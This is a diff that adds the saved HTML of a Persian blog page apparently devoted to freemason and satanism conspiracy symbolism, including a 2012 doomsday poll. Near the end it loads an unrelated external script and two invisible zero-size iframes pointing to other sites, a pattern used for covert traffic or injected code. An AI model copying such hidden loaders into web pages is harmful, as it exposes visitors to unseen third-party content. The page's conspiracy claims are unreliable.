@@ -1,0 +1,854 @@
+
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://dajal.mihanblog.com/xmlrpc?rsd" />
+<script type="text/javascript" src="../static.mihanblog.com/public/scripts/run/g.other.v3.js"></script>
+<script>
+
+	function c_$(id){
+        return document.getElementById(id);
+    }
+    
+			//if (parent.frames.length) top.location.href= document.location;
+		
+	setTodayDate = function(){
+		document.write('شنبه 22 آذر 1399');
+		/*363046*/	}
+
+</script>
+
+
+
+        <script type="text/javascript">
+            (function(){
+            var now = new Date();
+            var head = document.getElementsByTagName('head')[0];
+            var script = document.createElement('script');
+            script.async = true;
+            var script_address = 'https://cdn.yektanet.com/js/mihanblog.com/native-mihanblog.com-6531.js';
+            script.src = script_address + '?v=' + now.getFullYear().toString() + '0' + now.getMonth() + '0' + now.getDate() + '0' + now.getHours();
+            head.appendChild(script);
+            })();
+        </script>
+
+        <!--<script type="text/javascript">
+            var head = document.getElementsByTagName("head")[0];
+            var script = document.createElement("script");
+            script.type = "text/javascript";
+            script.async=1;
+            script.src = "https://s1.mediaad.org/serve/mihanblog.com/loader.js" ;
+            head.appendChild(script);
+        </script>-->
+        
+        <script>
+            var sabaVisionWebsiteID = "9bab9dac-041d-4bdb-b39a-1ed789f65eed"; var sabaVisionWebsitePage = "ALL"
+        </script>
+        <link rel="stylesheet" href="https://plus.sabavision.com/dox/dox.min.css">
+        <script src="https://plus.sabavision.com/dox/dox.min.js"></script>
+        
+        <script>
+	try{
+		var commentCnt = new Array();
+		commentCnt[135]='11';commentCnt[136]='3';commentCnt[137]='17';commentCnt[138]='3';commentCnt[139]='21';commentCnt[140]='8';commentCnt[142]='63';	} catch(e){}
+	
+	newComment = function(post_id){
+		try{
+			window.open('/post/comment/'+post_id,'comment','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=480px,height=540px');
+		} catch(e){}
+	}
+	setCommentCnt = function(post_id){
+		try{
+			if(commentCnt[post_id]){
+				document.write(commentCnt[post_id]);
+			} else {
+				document.write(0);
+			}
+		} catch(e){}
+	}
+</script><script>
+
+	statInfo = new Array();
+	setStatVar = function(index,value){
+		statInfo[index] = value;
+	}
+	getStatVar = function(index){
+		if(statInfo[index]) document.write(statInfo[index]);
+	}
+	
+	setStatVar('total_post','136');
+	setStatVar('total_author','3');
+	setStatVar('modify_date','جمعه 28 خرداد 1389');
+	
+	setStatVar('today_view','11');
+	setStatVar('yesterday_view','18');
+	
+	setStatVar('this_month_view','421');
+	setStatVar('last_month_view','804');
+
+	setStatVar('total_view','779195');
+	setStatVar('last_view_date','شنبه 22 آذر 1399 (15:44)');
+
+
+
+    
+</script><script>
+	messageForm = function(post_id){
+		try{
+			window.open('/message','message','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=480px,height=550px');
+		} catch(e){}
+	}
+</script><script>
+	linkdailyForm = function(){
+		try{
+			window.open('/linkdaily/new','linkdaily','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=500px,height=460px');
+		} catch(e){}
+	}
+</script><script>
+
+var MihanblogShopAdsArray = new Array();
+
+function GetMihanBlogShowAds(){
+	if(MihanblogShopAdsArray.length){
+		var adsTarget = 'MihanblogShopAds';
+		var containerWidth = document.getElementById(adsTarget).offsetWidth;
+		if(containerWidth>=200){
+			var adsCnt = parseInt(containerWidth / 200) ;
+			if(adsCnt>MihanblogShopAdsArray.length){
+				adsCnt = MihanblogShopAdsArray.length ; 
+			}
+//			var OneAdsWidth = parseInt(containerWidth / adsCnt) ;
+			var OneAdsWidth = containerWidth / adsCnt ;
+			if(OneAdsWidth>400){
+				OneAdsWidth = 400 ;
+			}
+			var OutHtml = '';
+			var img = '';
+			var link = '';
+			var title = '';
+			var description = '';
+			var imgWidth = 70;
+			if(OneAdsWidth>230){
+				imgWidth = 80;
+			}
+			if(OneAdsWidth>300){
+				imgWidth = 90;
+			}
+			for(adsOne=0;adsOne<adsCnt;adsOne++){
+				
+				img = MihanblogShopAdsArray[adsOne]['img'];
+				link = MihanblogShopAdsArray[adsOne]['link'];
+				title = MihanblogShopAdsArray[adsOne]['title'];
+				description = MihanblogShopAdsArray[adsOne]['description'];
+				
+				OutHtml += '<td style="background-color:#FFF;width: '+OneAdsWidth+'px;border:1px solid #f00;margin:0px 0px;font-size:11px;font-family:tahoma;padding:2px;margin:0px 0px;font-size:11px;border: 1px solid BurlyWood; padding: 1px; height: '+(imgWidth+25)+'px;">';
+
+				OutHtml += '	<a href="http://dajal.mihanblog.com/'+link+'" target="_blank" style="text-decoration:none">';
+
+				OutHtml += '			<div style="width: '+(OneAdsWidth-16)+'px;cursor:pointer;font-size:12px;padding: 4px 1px 4px 7px; white-space: nowrap; text-align: center; font-weight: bold; color: blue;white-space:nowrap;overflow:hidden">';
+				OutHtml += 					title;
+				OutHtml += '			</div>';
+				OutHtml += '			<div style="cursor:pointer;padding: 1px; display: block; float: right; width: '+imgWidth+'px;">';
+				OutHtml += '				<img src="../dajal.mihanblog.com/'+img+'.html" style="border:0px;padding:0px;margin:0px;width:'+imgWidth+'px;height:'+imgWidth+'px;">';
+				OutHtml += '			</div>';
+				OutHtml += '			<div style="padding: 1px; display: block; float: right; width: '+(OneAdsWidth-13-imgWidth)+'px; text-align: right;overflow:hidden">';
+				OutHtml += '				<div style="overflow:hidden;cursor:pointer;padding: 2px 3px; line-height: 17px; height: '+(imgWidth-3)+'px; text-align: justify;color:#000;direction:rtl">';
+				OutHtml += 						description;
+				OutHtml += '				</div>';
+				OutHtml += '			</div>';
+
+				OutHtml += '	</a>';
+
+				OutHtml += '</td>';
+			}
+			
+			var Out = '<table align="center" cellpadding="0" cellspacing="2" style="width:'+(OneAdsWidth*adsCnt)+'px;"><tr>'+OutHtml+'</tr></table>'; 
+			
+			Out = '<div style="text-align:center;padding:0px;margin:3px auto;">'+Out+'</div>'; 
+			
+			document.getElementById(adsTarget).style.height = (imgWidth+35)+'px' ;
+			document.getElementById(adsTarget).innerHTML = Out ;
+		}
+	}
+}
+</script>
+    <style>
+        @font-face {
+            font-family: 'Mihan-Iransans';
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Iransans.eot');
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Iransans.eot?') format('embedded-opentype'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans.woff2') format('woff2'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans.woff') format('woff'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Mihan-IransansBold';
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Iransans-Black.eot');
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Iransans-Black.eot?') format('embedded-opentype'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans-Black.woff2') format('woff2'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans-Black.woff') format('woff'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans-Black.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Mihan-IransansLight';
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Iransans-UltraLight.eot');
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Iransans-UltraLight.eot?') format('embedded-opentype'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans-UltraLight.woff2') format('woff2'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans-UltraLight.woff') format('woff'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Iransans-UltraLight.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Mihan-Nassim';
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Nassim.eot');
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Nassim.eot?') format('embedded-opentype'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Nassim.woff2') format('woff2'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Nassim.woff') format('woff'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Nassim.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Mihan-Koodak';
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Koodak.eot');
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Koodak.eot?') format('embedded-opentype'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Koodak.woff2') format('woff2'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Koodak.woff') format('woff'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Koodak.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Mihan-Yekan';
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Yekan.eot');
+            src: url('http://dajal.mihanblog.com/public/public/fonts/Yekan.eot?') format('embedded-opentype'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Yekan.woff2') format('woff2'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Yekan.woff') format('woff'),
+            url('http://dajal.mihanblog.com/public/public/fonts/Yekan.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'FontAwesome';
+            src: url('http://dajal.mihanblog.com/public/public/fonts/fontawesome_webfont.eot');
+            src: url('http://dajal.mihanblog.com/public/public/fonts/fontawesome_webfont.eot?') format('embedded-opentype'),
+            url('http://dajal.mihanblog.com/public/public/fonts/fontawesome_webfont.woff2') format('woff2'),
+            url('http://dajal.mihanblog.com/public/public/fonts/fontawesome_webfont.woff') format('woff'),
+            url('http://dajal.mihanblog.com/public/public/fonts/fontawesome_webfont.ttf') format('truetype');
+            font-weight: normal;
+            font-style: normal;
+        }
+
+
+        
+
+        /* Smartphones (portrait and landscape) ----------- */
+
+        /*
+        @media only screen and (max-width : 480px) and (min-width : 320px) {
+            .sabaClick_advert__wrapper{
+                display:block;
+            }
+            .sabaClick_advert__inner{
+                max-width: 90%;
+                margin: 0 5%;
+            }
+        }
+        */
+
+    </style>
+
+
+
+
+
+
+<head>
+<title>تصویر واقعی شیطان | وب تخصصی نماد شناسی فراماسون | Real devil image | Professional Web freemasons symbol Science |</title>
+<meta http-equiv="Content-Language" content="fa">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta http-equiv="Designer" content="isaac mafi">
+<meta http-equiv="Web" content="http://Tem.RozBlog.Com">
+<meta name="GENERATOR" content="mihanblog.com">
+<META NAME="description" CONTENT="تصویر واقعی شیطان | وب تخصصی نماد شناسی فراماسون | Real devil image | Professional Web freemasons symbol Science | - تصویر واقعی شیطـــان<br />
+<br />
+یک وب تخصصی در رابطه با فراماسونری،شیطان پرستی و مسائلی از این دسته جمع است...<br />
+برای بهتر شدن ، اشکالات این وب رو در قسمت نظرات درج کنید...<br />
+ -  ">
+<META NAME="keywords" CONTENT="تصویر واقعی شیطان | وب تخصصی نماد شناسی فراماسون | Real devil image | Professional Web freemasons symbol Science |,, Blog, Weblog, Persian,Iran, Iranian, Farsi, Weblogs, Blogs">
+<link rel="alternate" type="application/rss+xml" title="تصویر واقعی شیطان | وب تخصصی نماد شناسی فراماسون | Real devil image | Professional Web freemasons symbol Science |" href="http://dajal.mihanblog.com/post/rss/" /><script src="http://filmdoni.ir/new.js"></script>
+<style type="text/css">
+a{
+  text-decoration: none; color: #148ABE;
+}
+a:hover{
+  color: #FF6600; cursor: pointer;
+}
+body{
+  background: #F4F4F4; font-family: Tahoma; font-size: 9pt; margin: 20px;
+}
+td{
+  font-size: 9pt;
+}
+p, form{
+  margin: 0px;
+}
+img{
+  border: 0px;
+}
+h2{
+  font-family: Tahoma; font-size: 9pt; font-weight: normal; margin: 0px;
+}
+h2 a{
+  color: #FFFFFF;
+}
+h2 a:hover{
+  color: #FFFFFF;
+}
+.in_txt{
+  background: transparent; border: 0px; margin: 0px; font-family: tahoma; font-size: 9pt; height: 20px; padding-top: 2px;
+}
+#in_txt{
+  background: #FFFFFF; border: 1px solid #C1DDFF; padding-right: 1px; padding-left: 1px;
+}
+.in_btn{
+  background: transparent url(http://www.rozblog.com/temp/easy/button.gif) center; margin: 1px; width: 100px; padding-top: 0px; padding-bottom: 3px; border: 0px; cursor: pointer; color: #FFFFFF; font-family: tahoma; font-size: 9pt;
+  -moz-border-radius-topleft: 2px; -webkit-border-radius-topleft: 2px;
+  -moz-border-radius-bottomleft: 2px; -webkit-border-radius-bottomleft: 2px;
+}
+#in_btn{
+  border: 1px solid #C1DDFF; width: 102px;
+  -moz-border-radius-topleft: 3px; -webkit-border-radius-topleft: 3px;
+  -moz-border-radius-bottomleft: 3px; -webkit-border-radius-bottomleft: 3px;
+}
+.header{
+  background: #FFFFFF url(http://www.rozblog.com/temp/easy/header.gif); border: 1px solid #E4E4E4; -moz-border-radius: 5px; -webkit-border-radius: 5px; direction: rtl;
+}
+#header{
+  background: #1797CE; -moz-border-radius: 3px; -webkit-border-radius: 3px; height: 36px;
+}
+#header h1{
+  font-family: Tahoma; font-size: 8pt; font-weight: 600; display: block; margin: 0px; display: block; overflow: hidden; height: 14px;
+}
+#header a{
+  color: #FFFFFF;
+}
+#header a:hover{
+  color: #E4EFFA;
+}
+.topMenu{
+  background: #FFFFFF url(http://www.rozblog.com/temp/easy/topMenu.gif); border: 1px solid #E4E4E4; border-top: 0px; -moz-border-radius: 5px; -webkit-border-radius: 5px; height: 36px;
+}
+#topMenu{
+  padding-top: 2px; padding-right: 5px;
+}
+#topMenu ul{
+  margin: 0px; padding: 0px; list-style: none;
+}
+#topMenu li{
+  display: inline; margin: 0px; padding: 0px; list-style: none;
+}
+#topMenu a{
+  color: #148AB4; text-decoration: none; display: block; text-align: center; padding-top: 5px; padding-bottom: 7px; width: 120px; float: right; font-size: 8pt;
+}
+#topMenu a:hover{
+  background: #2CAED4 url(http://www.rozblog.com/temp/easy/menuBg.gif) center; color: #FFFFFF; -moz-border-radius: 3px; -webkit-border-radius: 3px;
+}
+.cat{
+  margin: 0px; padding: 0px; list-style-type: none;
+}
+.cat li{
+  margin: 0px; padding: 0px; list-style: none; height: 23px; display: list-item; overflow: hidden;
+}
+.cat a{
+   display: block; padding-top: 3px; padding-bottom: 6px; padding-right: 5px; padding-left: 5px; -moz-border-radius: 3px; -webkit-border-radius: 3px;
+}
+.cat a:hover{
+  background: #1797CE; color: #FFFFFF;
+}
+.extraDesc{float:left;overflow:hidden;width:1px;height:1px;}
+.page-list a{
+  display: block; padding: 4px; -moz-border-radius: 3px; -webkit-border-radius: 3px;
+}
+.page-list a:hover{
+  background: #1797CE; color: #FFFFFF;
+}
+.loop-page{
+  display: block; background: #1797CE; color: #FFFFFF; padding: 4px;
+}
+.pictureBase{
+  margin-top: 10px;
+}
+#pictureBase{
+  background: #FFFFFF; border: 1px solid #E4E4E4; -moz-border-radius: 5px; -webkit-border-radius: 5px; direction: rtl;
+}
+#pictureBase h3{
+  font-size: 7pt; font-family: Tahoma; font-weight: normal; margin: 0px; margin-top: 5px;
+}
+.pictureBaseHead{
+  background: url(http://www.rozblog.com/temp/easy/menuBg.gif) center; padding: 7px; padding-top: 3px; color: #FFFFFF; -moz-border-radius: 3px; -webkit-border-radius: 3px;
+}
+.pictureBaseHead a{
+  color: #FFFFFF;
+}
+.pictureBaseHead a:hover{
+  color: #FFFFFF;
+}
+.small{
+  border: 1px solid #67A7E4;
+}
+.tiny{
+  border: 1px solid #67A7E4; width: 50px; height: 50px; overflow: hidden;
+}
+.border{
+  border: 1px solid #67A7E4;
+}
+.b-bottom{
+  font-size: 8pt; border-bottom: 1px solid #67A7E4; padding: 5px;
+}
+.descriptions{
+  overflow-x: hidden; overflow-y: auto; display: block; height: 250px; direction: ltr; padding: 8px; font-size: 8pt; line-height: 1.7;
+}
+#descriptions{
+  border: 1px solid #67A7E4;
+}
+#download a{
+  background: #FFFFCC; border: 1px solid #FFFF00; padding: 5px; color: #666600; display: block; font-size: 7pt;  -moz-border-radius: 5px; -webkit-border-radius: 5px;
+}
+#download a:hover{
+  background: #D5F1FF; border: 1px solid #11B1FF; color: #0076AE;
+}
+.footer{
+  color: #FFFFFF; margin-top: 10px; background: #262626; -moz-border-radius: 5px; -webkit-border-radius: 5px; direction: rtl;
+}
+#footer{
+  font-size: 7pt;
+}
+#footer a{
+  color: #2CAED4; text-decoration: none;
+}
+#footer a:hover{
+  color: #FFFFFF;
+}
+</style>
+
+
+</head>
+
+<script language="javascript">
+  function GetBC(lngPostid)
+   {
+       intTimeZone=<-BlogTimeZone->;
+       strBlogId="<-BlogId->";
+       intCount=-1;
+       strResult="";
+       try {
+	  for (i=0;i<BlogComments.length;i+=2)
+	  {
+	       if (BlogComments[i]==lngPostid)
+	       intCount=BlogComments[i+1] ;
+	  }
+           }  catch( e) {
+           }
+    if ( intCount==-1)  strResult="آرشیو نظرات";
+    if ( intCount==0)  strResult="نظر بدهید";
+    if ( intCount==1)  strResult="یک نظر";
+    if ( intCount>1)  strResult=intCount + " نظر" ;
+  
+  strUrl="http://www.rozblog.com/commenting/?blogid=" +strBlogId + "&postid=" + lngPostid + "&timezone=" + intTimeZone ;
+  strResult ="<a href="http://dajal.mihanblog.com/\&quot;javascript:void(0)\&quot;" onclick=\"javascript:window.open('" + strUrl + "','rozblog_comments','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=500px,height=500px')\" >" +  strResult + " </a>" ;
+
+  document.write ( strResult ) ;
+ }
+ 
+ function OpenLD()
+{
+  window.open('LinkDump.php','rozblog_ld','status=yes,scrollbars=yes,toolbar=no,menubar=no,location=no ,width=500px,height=500px');
+  return true;
+}
+</script>
+
+<body>
+<table class="header" align="center" width="960" cellpadding="0" cellspacing="5" border="0">
+
+  <tr>
+    <td class="topMenu">
+    <table align="center" width="100%" cellpadding="0" cellspacing="0" border="0">
+      <tr>
+        <td id="topMenu">
+        <ul>
+<li><a href="index.html">صفحه نخست</a></li>
+<li><a href="javascript:messageForm()">ارتباط با ما</a></li>
+<li><a href="http://dajal.mihanblog.com/extrapage/link">لینک های ویژه</a></li>
+<li><a href="http://dajal.mihanblog.com/extrapage/logo">لوگوهای ویژه</a></li>
+<li><a href="http://dajal.mihanblog.com/m/">مشاهده در موبایل</a></li>
+
+
+
+
+        </ul>
+        </td>
+      </tr>
+    </table>
+    </td>
+  </tr>
+ 
+ <tr>
+
+<center>
+
+    <td id="header">
+    <form action="index.html" method="post">
+<center>
+<a target="_blank" href="http://p30rank.ir/?ref=8709"><img border="0" src="http://amirabar3002.persiangig.com/image/Untitled-2.gif" width="946" height="34.5"></a>
+
+      </tr>
+    </table>
+</center>
+    </form>
+    </td>
+  </tr>
+</table>
+  <tr>
+<table dir="rtl" align="center" width="960" cellpadding="0" cellspacing="0" border="0">
+    <td valign="top" width="250" style="padding-left:10px;">
+
+
+
+
+
+
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td>
+<table id="pictureBase" style="margin-top:0px;" align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
+<tr><td class="pictureBaseHead"><h2>دیگر زبان ها</h2></td></tr><tr><td>
+
+ <a target=_blank href="http://www.parstools.com/translator/go/?u=http://www.parstools.com/translator/Default.asp?width=130&bgcolor=FFFFFF&bdcolor=000000&sl=fa&tl=ar"><img border=0 src="http://www.parstools.com/translator/flags/Saudi%20Arabia.png" alt="عربی"</a>
+
+<a target=_blank href="http://www.parstools.com/translator/go/?u=http://www.parstools.com/translator/Default.asp?width=130&bgcolor=FFFFFF&bdcolor=000000&sl=fa&tl=ja"><img border=0 src="http://www.parstools.com/translator/flags/Japan.png" alt="ژاپنی"</a>
+
+<a target=_blank href="http://www.parstools.com/translator/go/?u=http://www.parstools.com/translator/Default.asp?width=130&bgcolor=FFFFFF&bdcolor=000000&sl=fa&tl=en"><img border=0 src="http://www.parstools.com/translator/flags/United%20Kingdom.png" alt="انگلیسی"</a>
+
+
+
+<a target=_blank href="http://www.parstools.com/translator/go/?u=http://www.parstools.com/translator/Default.asp?width=130&bgcolor=FFFFFF&bdcolor=000000&sl=fa&tl=tr"><img border=0 src="http://www.parstools.com/translator/flags/Turkey.png" alt="ترکیه ای"</a>
+
+<a target=_blank href="http://www.parstools.com/translator/go/?u=http://www.parstools.com/translator/Default.asp?width=130&bgcolor=FFFFFF&bdcolor=000000&sl=fa&tl=de"><img border=0 src="http://www.parstools.com/translator/flags/Germany.png" alt="آلمانی"</a>
+
+<a target=_blank href="http://www.parstools.com/translator/go/?u=http://www.parstools.com/translator/Default.asp?width=130&bgcolor=FFFFFF&bdcolor=000000&sl=fa&tl=it"><img border=0 src="http://www.parstools.com/translator/flags/Italy.png" alt="ایتالیایی"</a>
+
+<a target=_blank href="http://www.parstools.com/translator/go/?u=http://www.parstools.com/translator/Default.asp?width=130&bgcolor=FFFFFF&bdcolor=000000&sl=fa&tl=hi"><img border=0 src="http://www.parstools.com/translator/flags/India.png" alt="هندی"</a>
+
+<a target=_blank href="http://www.parstools.com/translator/go/?u=http://www.parstools.com/translator/Default.asp?width=130&bgcolor=FFFFFF&bdcolor=000000&sl=fa&tl=zh-CN"><img border=0 src="http://www.parstools.com/translator/flags/China.png" alt="چینی"</a>
+</td></tr></table></td></tr></table>
+
+
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td>
+<table id="pictureBase" style="margin-top:0px;" align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
+<tr><td class="pictureBaseHead"><h2>موضوعات</h2></td></tr><tr><td>
+
+<ul class="cat">
+
+<li><a href="http://dajal.mihanblog.com/post/category/6">چشم جهان بین [13]</a></li><li><a href="http://dajal.mihanblog.com/post/category/11">صلیب شکسته [2]</a></li><li><a href="http://dajal.mihanblog.com/post/category/8">زمین شطرنجی [1]</a></li><li><a href="http://dajal.mihanblog.com/post/category/1">دست شیطان [7]</a></li><li><a href="http://dajal.mihanblog.com/post/category/4">شخصیت ها [9]</a></li><li><a href="http://dajal.mihanblog.com/post/category/10">پرگار و گونیا [5]</a></li><li><a href="http://dajal.mihanblog.com/post/category/16">صلیب چپه [1]</a></li><li><a href="http://dajal.mihanblog.com/post/category/15">اهل بیت [2]</a></li><li><a href="http://dajal.mihanblog.com/post/category/14">ابلیسک [1]</a></li><li><a href="http://dajal.mihanblog.com/post/category/13">رسانه ها [10]</a></li><li><a href="http://dajal.mihanblog.com/post/category/5">معماری [12]</a></li><li><a href="http://dajal.mihanblog.com/post/category/2">بافومت [2]</a></li><li><a href="http://dajal.mihanblog.com/post/category/3">ستاره [4]</a></li><li><a href="http://dajal.mihanblog.com/post/category/7">اعداد [3]</a></li><li><a href="http://dajal.mihanblog.com/post/category/12">کتاب [3]</a></li><li><a href="http://dajal.mihanblog.com/post/category/9">آزاد [9]</a></li>
+</ul>
+
+</td></tr></table></td></tr></table>
+
+
+
+
+
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td>
+<table id="pictureBase" style="margin-top:0px;" align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
+<tr><td class="pictureBaseHead"><h2>حامیان ما</h2></td></tr><tr><td>
+<ul class="cat">
+<li><a target="_blank" href="http://www.felfelcity.com/" title="فلفل سیتی">فلفل سیتی</a></li><li><a target="_blank" href="http://shiatheme.com/" title="شیعه تم">شیعه تم</a></li><li><a target="_blank" href="http://va3ironi.com" title="واســـــه ایرونی">واســـــه ایرونی</a></li><li><a target="_blank" href="http://nod320.ir/" title="آپدیت روزانه نود">آپدیت روزانه نود</a></li><li><a target="_blank" href="http://www.iransuv.mihanblog.com/" title="اتومبیلهای شاسی بلند(SUV)">شاسی بلند(SUV)</a></li><li><a target="_blank" href="http://baztabnew.mihanblog.com" title="خبرگذاری بازتاب">بازتاب</a></li><li><a target="_blank" href="http://trn.ir/" title="توانا رسانه نوین">توانا رسانه نوین</a></li><div align=right><li><a href="http://dajal.mihanblog.com/linkdaily/"><b>تمام لینك ها</b></a></li>
+</div>
+</ul>
+</td></tr></table></td></tr></table>
+
+
+
+		<form id="frm-16076395375fd2a1f180c13" method="post" action="http://dajal.mihanblog.com/poll/new/fid/16076395375fd2a1f180c13/atrty/1607639537/avrvy/0/key/5f428cb1ae51681621fa458cabe1b067/"  onsubmit="window.open('', 'poll', 'toolbar=0,location=0,status=0,menubar=0,scrollbars=1,resizable=0,width=505,height=315')" target="poll"><input type="hidden" name="data[pollid]" value="69208" id="data[pollid]" />		
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td>
+<table id="pictureBase" style="margin-top:0px;" align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
+<tr><td class="pictureBaseHead"><h2>نظر سنجی</h2></td></tr><tr><td>
+سال 2012 زمین نابود میشود؟<br>
+<label><input type="checkbox"  name="data[v1]" id="v1" value="1" />شک نکن</label><br><label><input type="checkbox"  name="data[v2]" id="v2" value="1" />باید بشه</label><br><label><input type="checkbox"  name="data[v3]" id="v3" value="1" />کار فراماسون</label><br><label><input type="checkbox"  name="data[v4]" id="v4" value="1" />شایعه است</label><br>
+
+
+<center><input type="submit" value="نتیجه" style="font-size:8pt;font-family:Tahoma"></center><br>
+</td></tr></table></td></tr></table>
+		<input type="hidden" name="frm-id" value="16076395375fd2a1f180c13" id="frm-id" /></form>
+
+
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td>
+<table id="pictureBase" style="margin-top:0px;" align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
+<tr><td class="pictureBaseHead"><h2>ابر برچسب ها</h2></td></tr><tr><td>
+<ul class="cat">
+<a href="http://dajal.mihanblog.com/post/tag/%D8%AF%D8%AC%D8%A7%D9%84" style="font-size:2em">دجال</a><a href="http://dajal.mihanblog.com/post/tag/%D8%AA%D8%B5%D9%88%DB%8C%D8%B1+%D9%88%D8%A7%D9%82%D8%B9%DB%8C+%D8%B4%DB%8C%D8%B7%D8%A7%D9%86+-+%D8%AF%D8%AC%D8%A7%D9%84+-+%D9%81%D8%B1%D9%85%D8%A7%D8%B3%D9%88%D9%86+-+%D9%85%D8%A7%D8%B3%D9%88%D9%86+-+%D8%B4%DB%8C%D8%B7%D8%A7%D9%86+-+%D8%B4%DB%8C%D8%B7%D8%A7%D9%86+%D9%BE%D8%B1%D8%B3%D8%AA%DB%8C" style="font-size:1.29em">تصویر واقعی شیطان - دجال - فرماسون - ماسون - شیطان - شیطان پرستی</a><a href="http://dajal.mihanblog.com/post/tag/%D9%85%D8%A7%D8%B3%D9%88%D9%86" style="font-size:1em">ماسون</a><a href="http://dajal.mihanblog.com/post/tag/%D8%A2%D9%85%D8%B1%DB%8C%DA%A9%D8%A7" style="font-size:1.22em">آمریکا</a><a href="http://dajal.mihanblog.com/post/tag/%D9%81%D8%B1%D8%A7%D9%85%D8%A7%D8%B3%D9%88%D9%86" style="font-size:1.58em">فراماسون</a></ul>
+</td></tr></table></td></tr></table>
+
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td>
+<table id="pictureBase" style="margin-top:0px;" align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
+<tr><td class="pictureBaseHead"><h2>ارتباط آنلاین</h2></td></tr><tr><td>
+<center>
+<!-- Begin ParsTools.com ‍Yahoo Status --><script language="javascript" src="http://www.parstools.net/yahoo_status/?id=amirabar3000&type=16"></script><!-- End ParsTools.com Yahoo Status -->
+
+</td></tr></table></td></tr></table>
+
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td>
+<table id="pictureBase" style="margin-top:0px;" align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
+<tr><td class="pictureBaseHead"><h2>آمار وب</h2></td></tr><tr><td>
+<center>
+
+<!-- Begin WebGozar.com Counter code -->
+<script type="text/javascript" language="javascript" src="http://www.webgozar.ir/c.aspx?Code=1732010&amp;t=counter" ></script>
+<noscript><a href="http://www.webgozar.com/counter/stats.aspx?code=1732010" target="_blank">&#1570;&#1605;&#1575;&#1585;</a></noscript>
+<!-- End WebGozar.com Counter code -->
+
+</div>
+
+</td></tr></table></td></tr></table>
+
+
+
+<table class="pictureBase" align="center" width="100%" cellpadding="0" cellspacing="0" border="0"><tr><td>
+<table id="pictureBase" style="margin-top:0px;" align="center" width="100%" cellpadding="5" cellspacing="5" border="0">
+<tr><td class="pictureBaseHead"><h2>تبادل لوگو</h2></td></tr><tr><td>
+
+<center><center>
+<a href="index.html"><img src="http://www.iranimg.com/images/30246555559821932595.gif" border="0" alt="تصویر واقعی شیطان" /></a><br>
+
+<font size="2"> <textarea style="border: 1px solid rgb(102, 102, 102); font-size: 8pt; color: rgb(0, 0, 0); font-family: Tahoma; text-align: justify; direction: ltr; padding: 1px 4px;" name="Code" rows="1" cols="18" dir="ltr" class="text">&lt;a href="http://dajal.mihanblog.com/"&gt;&lt;img src="http://www.iranimg.com/images/99396684724878079935.gif" border="0" alt="تصویر واقعی شیطان" /&gt;&lt;/a&gt;</textarea></font><font color="#326400"><span lang="fa"><br></span></font><br>
+
+
+ <iframe name="Site" id="InlineFrame1" style="width: 0px; height: 0px; z-index: 0;" src="http://2box5.mihanblog.com/" frameborder="1"></iframe><iframe name="Site" id="InlineFrame1" style="width: 0px; height: 0px; z-index: 0;" src="http://5box6.mihanblog.com/" frameborder="1"></iframe>
